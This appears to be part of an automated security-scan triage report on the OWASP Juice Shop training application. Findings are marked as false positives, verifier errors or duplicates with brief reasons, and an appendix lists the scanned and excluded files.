- **[VERIFY-ERR]** `server.ts:266` other (spec-crypto-01) — verifier output unparseable
- **[VERIFY-ERR]** `data/datacreator.ts:135` other (spec-crypto-03) — verifier output unparseable
- **[FP]** `data/static/codefixes/noSqlReviewsChallenge_2.ts:4` injection (spec-crypto-05) — The file is a static educational challenge asset (codefix option), never imported or executed in production; no callers exist anywhere in the codebase.
- **[VERIFY-ERR]** `data/static/codefixes/dbSchemaChallenge_1.ts:3` injection (spec-crypto-05) — verifier output unparseable
- **[VERIFY-ERR]** `data/static/codefixes/nftMintChallenge_1.sol:20` logic-flaw (spec-crypto-05) — verifier output unparseable
- **[VERIFY-ERR]** `data/staticData.ts:14` other (spec-crypto-07) — verifier output unparseable
- **[VERIFY-ERR]** `frontend/src/app/Services/user.service.ts:50` info-leak (spec-crypto-10) — verifier output unparseable
- **[FP]** `lib/antiCheat.ts:148` logic-flaw (spec-crypto-18) — (no reason given)
- **[FP]** `lib/botUtils.ts:21` other (spec-crypto-19) — There is no Math.random or PRNG in generateCoupon; the scanner misidentified the mechanism entirely. The coupon is simply base85(MMYY-discount) with no randomness at all.
- **[FP]** `lib/challengeUtils.ts:46` info-leak (spec-crypto-20) — CTF flag broadcast is intended scoreboard functionality; flags are game tokens with no real credentials, and config validation prevents inconsistent modes
- **[FP]** `lib/utils.ts:85` injection (spec-crypto-30) — No HMAC verification endpoint exists; HMAC-SHA-1 collision attacks do not apply to forgery with unknown keys; scanner conflated the algorithm with the integrity-check bypass claim which has no code target.
- **[FP]** `models/product.ts:41` injection (spec-crypto-46) — Intentional CTF challenge feature in a deliberately vulnerable wargame application; default safetyMode: auto protects standard deployments
- **[FP]** `models/user.ts:70` other (spec-crypto-52) — scanner misidentified the algorithm (MD5 vs SHA-1) and this is OWASP Juice Shop, an intentionally insecure training application where weak hashing is by design
- **[FP]** `routes/2fa.ts:95` logic-flaw (spec-crypto-54) — Scanner misidentified hash function as "reversible Base64" when code actually uses one-way MD5 hex; the core exploit premise (instant reversal) is impossible.
- **[VERIFY-ERR]** `routes/basketItems.ts:34` logic-flaw (spec-crypto-62) — verifier output unparseable
- **[FP]** `routes/captcha.ts:11` other (spec-crypto-63) — scanner misread the code: the answer is returned verbatim in the response JSON (`res.json(captcha)`), so the described "brute-force PRNG prediction" exploit path never applies; the actual vulnerability is information disclosure, not weak randomness
- **[FP]** `routes/chatbot.ts:20` other (spec-crypto-65) — The config value is entirely static-at-startup with no runtime mutation path or external caller; no attacker can inject into it without already having deploy/config-file access.
- **[VERIFY-ERR]** `routes/coupon.ts:10` info-leak (spec-crypto-69) — verifier output unparseable
- **[VERIFY-ERR]** `routes/currentUser.ts:49` injection (spec-crypto-71) — verifier output unparseable
- **[FP]** `routes/dataExport.ts:101` other (spec-crypto-73) — The code is a CTF challenge flag checker, not an authorization or verification mechanism. The scanner misread the purpose of `challengeUtils.solveIf` and incorrectly assumed the hash comparison gated or validated access to order data. Data access is correctly scoped to the authenticated user via a MongoDB email filter, and `emailHash` is never used to control data flow or leak information.
- **[VERIFY-ERR]** `routes/delivery.ts:17` logic-flaw (spec-crypto-74) — verifier output unparseable
- **[FP]** `routes/imageCaptcha.ts:49` info-leak (spec-crypto-79) — Timing attack claim is theoretically valid on line 49 but trivially obviated by answer exposure in line 28 response and broken logic (line 49 passes when no captcha record exists); scanner misidentified the exploitable path
- **[FP]** `routes/keyServer.ts:10` injection (spec-crypto-80) — Express URL normalization prevents `..` from reaching the handler; `res.sendFile` safely rejects directory paths with 403; no exploitable attack path exists.
- **[VERIFY-ERR]** `routes/metrics.ts:53` injection (spec-logic-bug-86) — verifier output unparseable
- **[VERIFY-ERR]** `routes/order.ts:38` other (spec-crypto-88) — verifier output unparseable
- **[VERIFY-ERR]** `routes/orderHistory.ts:10` logic-flaw (spec-crypto-89) — verifier output unparseable
- **[FP]** `routes/privacyPolicyProof.ts:8` logic-flaw (spec-crypto-92) — (no reason given)
- **[VERIFY-ERR]** `routes/profileImageFileUpload.ts:32` logic-flaw (spec-crypto-93) — verifier output unparseable
- **[FP]** `routes/repeatNotification.ts:6` logic-flaw (spec-crypto-98) — scanner misread a read-only `if (challenge?.solved)` check as a state-modifying write; the endpoint never marks any challenge as solved
- **[FP]** `routes/resetPassword.ts:38` other (spec-crypto-99) — Scanner misread `security.hmac` as a public hash (it's a keyed HMAC), and rate limiting (100/5min) on `/rest/user/reset-password` plus network latency neutralize the timing oracle; also this is a CTF/training app, not production.
- **[FP]** `routes/showProductReviews.ts:26` injection (spec-crypto-104) — (no reason given)
- **[FP]** `routes/updateUserProfile.ts:27` logic-flaw (spec-crypto-107) — OWASP Juice Shop intentionally omits CSRF protection as part of its CSRF training challenge; the "CSRF" challenge is a formal CTF challenge in data/static/challenges.yml, and challengeUtils.solveIf is the challenge detection hook
- **[FP]** `routes/verify.ts:114` logic-flaw (spec-crypto-109) — The vulnerable code is exclusively internal CTF challenge evaluation logic; it only records a puzzle "solved" flag and cannot achieve the claimed administrative privilege escalation.
- **[FP]** `routes/vulnCodeFixes.ts:80` race-condition (spec-crypto-111) — No background process ever writes to the static codefixes directory; the existsSync branch is intentional control flow for optional YAML metadata; Express errorhandler catches any ENOENT before it reaches the client
- **[FP]** `rsn/rsnUtil.ts:106` other (spec-access-control-118) — no external/attacker-controlled input reaches seePatch or checkDiffs; they are only called internally by build/dev scripts with keys from a local directory listing via readFiles().
- **[FP]** `views/userProfile.pug:45` logic-flaw (spec-crypto-123) — (no reason given)
- **[VERIFY-ERR]** `server.ts:423` logic-flaw (spec-logic-bug-01) — verifier output unparseable
- **[FP]** `data/datacache.ts:31` logic-flaw (spec-logic-bug-02) — No API route calls the setter; the only production caller sets it at startup from a config file
- **[FP]** `data/datacreator.ts:106` race-condition (spec-logic-bug-03) — (no reason given)
- **[VERIFY-ERR]** `data/static/codefixes/unionSqlInjectionChallenge_1.ts:3` injection (spec-logic-bug-05) — verifier output unparseable
- **[FP]** `data/static/codefixes/web3WalletChallenge_1.sol:20` logic-flaw (spec-logic-bug-06) — (no reason given)
- **[VERIFY-ERR]** `data/staticData.ts:7` logic-flaw (spec-logic-bug-07) — verifier output unparseable
- **[FP]** `frontend/src/app/Services/basket.service.ts:54` logic-flaw (spec-logic-bug-10) — The finding describes a standard client-side functional defect where missing session state (null `bid`) causes `parseInt` to return `NaN`. This results in a GET request to an invalid URL (`/rest/basket/NaN`) which likely returns a 404 or error, causing the basket view to display as empty or silent fail (Availability impact A:L). This does not result in data disclosure, privilege escalation, or server-side exploitation; it is a UX/robustness bug, not a security vulnerability.
- **[VERIFY-ERR]** `frontend/src/app/Services/local-backup.service.ts:58` logic-flaw (spec-logic-bug-10) — verifier output unparseable
- **[VERIFY-ERR]** `frontend/src/app/Services/track-order.service.ts:18` logic-flaw (spec-logic-bug-10) — verifier output unparseable
- **[VERIFY-ERR]** `frontend/src/app/data-export/data-export.component.ts:43` logic-flaw (spec-logic-bug-11) — verifier output unparseable
- **[FP]** `frontend/src/app/score-board/score-board.component.ts:205` logic-flaw (spec-logic-bug-12) — No security impact: the bug causes only transient UI inconsistency (flicker/stale display) when unlocking hints; no sensitive data is exposed, no authZ bypass, no data leakage path exists.
- **[VERIFY-ERR]** `frontend/src/app/score-board/helpers/challenge-filtering.ts:79` logic-flaw (spec-logic-bug-12) — verifier output unparseable
- **[VERIFY-ERR]** `lib/challengeUtils.ts:48` logic-flaw (spec-logic-bug-20) — verifier output unparseable
- **[FP]** `lib/challengeUtils.ts:108` logic-flaw (spec-logic-bug-20) — The code asymmetry is real but does not bypass any security boundary; reaching solveFixIt requires knowing the correct fix (i.e., solving the challenge), so the "bypass" of the intermediate Find It phase has no security impact beyond game mechanic optimization.
- **[VERIFY-ERR]** `lib/codingChallenges.ts:21` race-condition (spec-logic-bug-21) — verifier output unparseable
- **[FP]** `lib/codingChallenges.ts:50` injection (spec-logic-bug-21) — (no reason given)
- **[FP]** `lib/insecurity.ts:180` race-condition (spec-logic-bug-23) — Scanner mischaracterizes cache key mismatch as auth bypass. Quoted JWTs fail jwt.verify entirely (cache pop is never attempted), producing consistent access denial, not intermittent bypass. No downstream handler treats cache misses as authorization grants.
- **[FP]** `lib/is-windows.ts:4` logic-flaw (spec-logic-bug-26) — isWindows() only gates CTF challenge enablement in a bug-bounty training app; no real security boundary or security impact exists.
- **[VERIFY-ERR]** `lib/startup/validatePreconditions.ts:84` logic-flaw (spec-logic-bug-29) — verifier output unparseable
- **[FP]** `lib/startup/validateConfig.ts:145` logic-flaw (spec-logic-bug-29) — (no reason given)
- **[VERIFY-ERR]** `lib/startup/customizeApplication.ts:42` other (spec-logic-bug-29) — verifier output unparseable
- **[VERIFY-ERR]** `lib/utils.ts:193` logic-flaw (spec-logic-bug-30) — verifier output unparseable
- **[FP]** `models/basket.ts:33` logic-flaw (spec-logic-bug-33) — **
- **[FP]** `models/basketitem.ts:19` logic-flaw (spec-logic-bug-34) — Juice Shop CTF challenges intentionally allow negative quantities (negativeOrderChallenge); the scanner falsely diagnoses this as a real e-commerce logic flaw in application logic rather than a deliberate CTF exploit target.
- **[FP]** `models/captcha.ts:21` logic-flaw (spec-logic-bug-35) — Scanner misread the code: captchaId is always explicitly set to req.app.locals.captchaId++ (a server-side counter) before write, so it is never null at insert time; the alleged null-ID defect cannot occur.
- **[FP]** `models/card.ts:36` integer-overflow (spec-logic-bug-36) — No runtime API accepts user-supplied cardNum; the only write path is a server startup data-seeding script (datacreator.ts), and the app uses SQLite where INTEGER is 64-bit.
- **[VERIFY-ERR]** `models/feedback.ts:20` logic-flaw (spec-logic-bug-40) — verifier output unparseable
- **[VERIFY-ERR]** `models/relations.ts:123` logic-flaw (spec-logic-bug-49) — verifier output unparseable
- **[FP]** `models/user.ts:125` logic-flaw (spec-logic-bug-52) — The scanner misread `await Promise.reject()` as error-suppressing; in JavaScript, awaiting a rejected promise throws the error, which Sequelize's hook runner correctly propagates, halting the DB operation.
- **[FP]** `routes/angular.ts:9` logic-flaw (spec-logic-bug-56) — standard Angular SPA catch-all; no server-side route exists at /checkout; all API endpoints retain auth guards; claim misreads normal SPA architecture
- **[FP]** `routes/authenticatedUsers.ts:18` logic-flaw (spec-logic-bug-59) — Operator precedence bug exists but produces dead-code `*1000` that only yields a non-functional timestamp in an API response field; no security impact, no access path to exploit.
- **[FP]** `routes/b2bOrder.ts:23` logic-flaw (spec-logic-bug-60) — The timeout path IS the intended solving mechanism for the rceOccupyChallenge; the scanner misread the challenge design as a logic flaw
- **[FP]** `routes/chatbot.ts:83` logic-flaw (spec-logic-bug-65) — The bot cache is ephemeral in-memory display state for names only; no auth boundary, data exposure, or code execution path exists. The scanner conflated a cosmetic data-staleness glitch with a meaningful integrity breach.
- **[FP]** `routes/countryMapping.ts:5` logic-flaw (spec-logic-bug-68) — Scanner mischaracterizes benign public CTF metadata (challenge key → country display name mapping) as sensitive config data; the endpoint is intentionally unauthenticated for frontend use
- **[FP]** `routes/delivery.ts:29` logic-flaw (spec-logic-bug-74) — Scanner fabricated a query-parameter bypass that does not exist; isDeluxe() uses JWT header parsing with signature verification, not query parameters.
- **[VERIFY-ERR]** `routes/easterEgg.ts:10` logic-flaw (spec-logic-bug-76) — verifier output unparseable
- **[FP]** `routes/imageCaptcha.ts:39` logic-flaw (spec-logic-bug-79) — The claimed "authorization bypass" is incorrect because the route has a JWT auth gate (`appendUserId()`) that blocks unauthenticated access before `verifyImageCaptcha` runs; the actual impact is limited to an authenticated user bypassing CAPTCHA friction on their own identical data export
- **[VERIFY-ERR]** `routes/languages.ts:77` logic-flaw (spec-logic-bug-81) — verifier output unparseable
- **[VERIFY-ERR]** `routes/orderHistory.ts:22` logic-flaw (spec-logic-bug-89) — verifier output unparseable
- **[VERIFY-ERR]** `routes/premiumReward.ts:9` logic-flaw (spec-logic-bug-91) — verifier output unparseable
- **[VERIFY-ERR]** `routes/verify.ts:34` logic-flaw (spec-logic-bug-109) — verifier output unparseable
- **[FP]** `rsn/rsn-verbose.ts:17` logic-flaw (spec-logic-bug-116) — The script is a local developer CLI tool never invoked in CI (CI runs `rsn.ts`, not `rsn-verbose.ts`), there is no external entry point, and the scanner misreads Node.js event loop semantics (process.exitCode does not cause immediate termination; pending microtasks are processed first).
- **[FP]** `views/dataErasureResult.hbs:23` logic-flaw (spec-logic-bug-120) — scanner overlooked res.clearCookie('token') in the server handler and mis-characterized a general architectural design pattern as a specific client-side bug; the in-memory Map retention is a memory leak, not exploitable for unauthorized access without a pre-captured token which is itself a separate vulnerability
- **[VERIFY-ERR]** `views/promotionVideo.pug:30` logic-flaw (spec-logic-bug-121) — verifier output unparseable
- **[FP]** `views/promotionVideo.pug:85` logic-flaw (spec-logic-bug-121) — The scanner correctly identified a JavaScript bug (`if (start && end)` evaluates to false when `start` is `0`), confirming that cues starting at `00:00:00` are dropped. However, this is a client-side caption rendering defect with zero security impact (no data exposure, authentication bypass, or injection vector). It falls under the "NO SECURITY IMPACT" category.
- **[VERIFY-ERR]** `views/promotionVideo.pug:64` logic-flaw (spec-logic-bug-121) — verifier output unparseable
- **[FP]** `data/mongodb.ts:5` other (spec-access-control-04) — The exported collections in `data/mongodb.ts` are standard singleton library handles. The scanner falsely attributes IDOR/BOLA to this utility layer; the actual risk lies in downstream route logic (e.g., `allOrders`), which is not even mapped to an HTTP route in `app.ts`, making the finding unreachable.
- **[FP]** `data/static/codefixes/registerAdminChallenge_1.ts:34` logic-flaw (spec-access-control-05) — The cited file is static educational challenge data in data/static/codefixes/, not executable production code. No request path or import loads or executes this file. The actual production User registration code was not flagged.
- **[FP]** `data/static/codefixes/changeProductChallenge_4.ts:17` logic-flaw (spec-access-control-05) — (no reason given)
- **[FP]** `data/static/codefixes/adminSectionChallenge_4.ts:2` logic-flaw (spec-access-control-05) — the cited file is static reference data for a CTF challenge, never compiled or executed; the actual production code in app.routing.ts correctly uses AdminGuard.
- **[FP]** `data/static/codefixes/web3SandboxChallenge_2.ts:167` logic-flaw (spec-access-control-06) — the cited file is a coding challenge puzzle (intentionally flawed sample code), not production application code; the scanner misidentified challenge content as deployable source.
- **[FP]** `frontend/src/app/accounting/accounting.component.ts:132` logic-flaw (spec-access-control-10) — Finding is on frontend code only; actual authorization is enforced by the backend which is not in this repo; frontend alone cannot cause privilege escalation
- **[VERIFY-ERR]** `frontend/src/app/address-create/address-create.component.ts:43` logic-flaw (spec-access-control-10) — verifier output unparseable
- **[FP]** `frontend/src/app/order-completion/order-completion.component.ts:46` other (spec-access-control-11) — (no reason given)
- **[VERIFY-ERR]** `frontend/src/app/order-summary/order-summary.component.ts:70` logic-flaw (spec-access-control-11) — verifier output unparseable
- **[FP]** `frontend/src/app/user-details/user-details.component.ts:23` logic-flaw (spec-access-control-12) — The component is exclusively used within an administrative interface protected by AdminGuard, where cross-user data access is an intended privileged function, not a security flaw.
- **[VERIFY-ERR]** `lib/utils.ts:117` other (spec-access-control-30) — verifier output unparseable
- **[FP]** `models/card.ts:15` logic-flaw (spec-access-control-36) — The scanner ignored the `security.appendUserId()` middleware which unconditionally overwrites `UserId` with the authenticated session owner's ID before `finale-rest` persists the model.
- **[VERIFY-ERR]** `models/product.ts:21` logic-flaw (spec-access-control-46) — verifier output unparseable
- **[VERIFY-ERR]** `models/user.ts:76` logic-flaw (spec-access-control-52) — verifier output unparseable
- **[VERIFY-ERR]** `routes/b2bOrder.ts:14` other (spec-access-control-60) — verifier output unparseable
- **[VERIFY-ERR]** `routes/captcha.ts:11` logic-flaw (spec-access-control-63) — verifier output unparseable
- **[FP]** `routes/chatbot.ts:133` logic-flaw (spec-access-control-65) — The scanner incorrectly claims "no verification" exists; line 245 shows explicit `jwt.verify()` usage. Without the private key, token forgery is impossible. Additionally, the "account control" claim is an exaggeration of a minor cosmetic update.
- **[VERIFY-ERR]** `routes/continueCode.ts:9` info-leak (spec-access-control-67) — verifier output unparseable
- **[FP]** `routes/dataExport.ts:21` other (spec-access-control-73) — security.appendUserId() middleware overwrites req.body.UserId with the authenticated user's ID before the handler reads it; the scanner misread the code as using user-supply input
- **[FP]** `routes/delivery.ts:8` other (spec-access-control-74) — Scanner mischaracterized cryptographic JWT verification as 'unvalidated'; isDeluxe() requires an RS256-signed token valid under the RSA keypair, which cannot be forged without the private key (loaded at runtime from a non-committed file).
- **[FP]** `routes/deluxe.ts:16` other (spec-access-control-75) — ** — The scanner misread the data flow: the `security.appendUserId()` middleware (registered before the handler on this route) overwrites `req.body.UserId` with the server-resolved authenticated user's ID from the JWT token map. The `req.body.UserId` value from the client is never used in the database query, so there is no IDOR.
- **[VERIFY-ERR]** `routes/memory.ts:19` info-leak (spec-access-control-85) — verifier output unparseable
- **[VERIFY-ERR]** `routes/orderHistory.ts:22` info-leak (spec-access-control-89) — verifier output unparseable
- **[VERIFY-ERR]** `routes/privacyPolicyProof.ts:8` other (spec-access-control-92) — verifier output unparseable
- **[VERIFY-ERR]** `routes/restoreProgress.ts:13` other (spec-access-control-100) — verifier output unparseable
- **[FP]** `routes/updateUserProfile.ts:27` other (spec-access-control-107) — OWASP Juice Shop is an intentionally vulnerable training application; the CSRF vulnerability is the documented challenge (#csrfChallenge), not an accidental production defect.
- **[FP]** `routes/userProfile.ts:52` other (spec-access-control-108) — Intentionally vulnerable CTF training app (OWASP Juice Shop); eval() is a deliberate gamified challenge, not a product vulnerability
- **[VERIFY-ERR]** `routes/verify.ts:25` logic-flaw (spec-access-control-109) — verifier output unparseable
- **[FP]** `routes/vulnCodeSnippet.ts:85` other (spec-access-control-112) — whitelist guard in retrieveCodeSnippet() blocks all non-legitimate challenge keys before reaching the path construction
- **[FP]** `Dockerfile:2` info-leak (spec-iac-01) — The .dockerignore file explicitly excludes .git/, preventing it from being included in the build context or the final image.
- **[DUP of #23]** `routes/securityQuestion.ts:9` info-leak (spec-crypto-103) — Differential response leakage and unauthenticated disclosure both stem from the exact same missing security check in the same route handler and line range.


---

## Appendix: Scan Scope

### Folders scanned (105)

- `./`
- `config/`
- `data/`
- `data/static/`
- `data/static/codefixes/`
- `data/static/web3-snippets/`
- `frontend/`
- `frontend/src/`
- `frontend/src/app/`
- `frontend/src/app/Models/`
- `frontend/src/app/Services/`
- `frontend/src/app/about/`
- `frontend/src/app/accounting/`
- `frontend/src/app/address/`
- `frontend/src/app/address-create/`
- `frontend/src/app/address-select/`
- `frontend/src/app/administration/`
- `frontend/src/app/basket/`
- `frontend/src/app/challenge-solved-notification/`
- `frontend/src/app/challenge-status-badge/`
- `frontend/src/app/change-password/`
- `frontend/src/app/chatbot/`
- `frontend/src/app/code-area/`
- `frontend/src/app/code-fixes/`
- `frontend/src/app/code-snippet/`
- `frontend/src/app/complaint/`
- `frontend/src/app/contact/`
- `frontend/src/app/ctf-system-wide-notification/`
- `frontend/src/app/data-export/`
- `frontend/src/app/delivery-method/`
- `frontend/src/app/deluxe-user/`
- `frontend/src/app/error-page/`
- `frontend/src/app/faucet/`
- `frontend/src/app/feedback-details/`
- `frontend/src/app/forgot-password/`
- `frontend/src/app/last-login-ip/`
- `frontend/src/app/login/`
- `frontend/src/app/mat-search-bar/`
- `frontend/src/app/navbar/`
- `frontend/src/app/nft-unlock/`
- `frontend/src/app/oauth/`
- `frontend/src/app/order-completion/`
- `frontend/src/app/order-history/`
- `frontend/src/app/order-summary/`
- `frontend/src/app/password-strength/`
- `frontend/src/app/password-strength-info/`
- `frontend/src/app/payment/`
- `frontend/src/app/payment-method/`
- `frontend/src/app/photo-wall/`
- `frontend/src/app/privacy-policy/`
- `frontend/src/app/privacy-security/`
- `frontend/src/app/product-details/`
- `frontend/src/app/product-review-edit/`
- `frontend/src/app/purchase-basket/`
- `frontend/src/app/qr-code/`
- `frontend/src/app/recycle/`
- `frontend/src/app/register/`
- `frontend/src/app/saved-address/`
- `frontend/src/app/saved-payment-methods/`
- `frontend/src/app/score-board/`
- `frontend/src/app/score-board/components/challenge-card/`
- `frontend/src/app/score-board/components/challenges-unavailable-warning/`
- `frontend/src/app/score-board/components/coding-challenge-progress-score-card/`
- `frontend/src/app/score-board/components/difficulty-overview-score-card/`
- `frontend/src/app/score-board/components/difficulty-stars/`
- `frontend/src/app/score-board/components/filter-settings/`
- `frontend/src/app/score-board/components/filter-settings/components/category-filter/`
- `frontend/src/app/score-board/components/filter-settings/components/score-board-additional-settings-dialog/`
- `frontend/src/app/score-board/components/filter-settings/pipes/`
- `frontend/src/app/score-board/components/hacking-challenge-progress-score-card/`
- `frontend/src/app/score-board/components/score-card/`
- `frontend/src/app/score-board/components/tutorial-mode-warning/`
- `frontend/src/app/score-board/components/warning-card/`
- `frontend/src/app/score-board/filter-settings/`
- `frontend/src/app/score-board/helpers/`
- `frontend/src/app/score-board/types/`
- `frontend/src/app/search-result/`
- `frontend/src/app/server-started-notification/`
- `frontend/src/app/sidenav/`
- `frontend/src/app/token-sale/`
- `frontend/src/app/track-result/`
- `frontend/src/app/two-factor-auth/`
- `frontend/src/app/two-factor-auth-enter/`
- `frontend/src/app/user-details/`
- `frontend/src/app/wallet/`
- `frontend/src/app/wallet-web3/`
- `frontend/src/app/web3-sandbox/`
- `frontend/src/app/welcome/`
- `frontend/src/app/welcome-banner/`
- `frontend/src/assets/i18n/`
- `frontend/src/assets/private/`
- `frontend/src/assets/public/`
- `frontend/src/confetti/`
- `frontend/src/environments/`
- `frontend/src/hacking-instructor/`
- `frontend/src/hacking-instructor/challenges/`
- `frontend/src/hacking-instructor/helpers/`
- `lib/`
- `lib/startup/`
- `models/`
- `monitoring/`
- `routes/`
- `rsn/`
- `views/`
- `views/themes/`

### Excluded from scan (57074 files)

**Folders** (matched `exclude_dirs`):

- `node_modules/` — 54540 files
- `.git/` — 1363 files
- `build/` — 582 files
- `test/` — 139 files
- `.github/` — 22 files
- `.junie/` — 15 files
- `.well-known/` — 13 files
- `ftp/` — 13 files
- `.nyc_output/` — 5 files
- `vagrant/` — 3 files
- `.claude/` — 2 files
- `encryptionkeys/` — 2 files
- `.cursor/` — 1 files
- `.continue/` — 1 files
- `.codeium/` — 1 files
- `.zap/` — 1 files
- `.gitlab/` — 1 files
- `.dependabot/` — 1 files
- `checkpoints/` — 1 files

**File types** (matched `exclude_exts`):

- `*.jpg` — 55 files
- `*.png` — 49 files
- `*.jpeg` — 4 files
- `*.svg` — 3 files
- `*.ico` — 2 files
- `*.min.js` — 2 files
- `*.stl` — 2 files
- `*.key` — 1 files
- `*.gif` — 1 files
- `*.vtt` — 1 files
- `*.ai` — 1 files
- `*.mp4` — 1 files

**Patterns** (matched `exclude_globs`):

- `**/*.spec.ts` — 111 files
- `data/static/i18n/**` — 43 files
- `**/.gitkeep` — 3 files
- `**/.gitignore` — 2 files
- `**/.editorconfig` — 2 files
- `**/.mailmap` — 1 files
- `**/.dockerignore` — 1 files
- `**/LICENSE` — 1 files

**Config dedup**: 128 config files -> 3 shape-clusters; kept 3 representatives + 0 promoted (suspicious value), dropped 82 near-duplicates.

- `frontend/src/assets/i18n/ru_RU.json` x43 (kept 1, dropped 42)
- `data/static/codefixes/localXssChallenge.info.yml` x31 (kept 1, dropped 30)
- `data/static/codefixes/resetPasswordBjoernOwaspChallenge_1.yml` x11 (kept 1, dropped 10)
